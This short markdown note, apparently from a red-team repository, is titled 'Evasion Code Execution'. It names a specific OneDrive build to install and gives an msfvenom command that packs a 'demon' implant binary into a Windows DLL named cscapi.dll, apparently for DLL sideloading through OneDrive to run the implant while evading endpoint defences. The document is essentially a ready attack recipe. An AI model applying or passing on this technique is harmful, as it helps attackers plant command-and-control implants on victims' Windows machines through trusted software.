# Evasion Code Execution

Make sure OneDrive Last released build 25.070.0413.0001 is installed <https://go.microsoft.com/fwlink/?linkid=844652>
```bash
cat demon.x64.bin | msfvenom -p - -a x64 --platform windows -f dll -o cscapi.dll
```

![Screenshot](./images/codeexec_medr.jpg)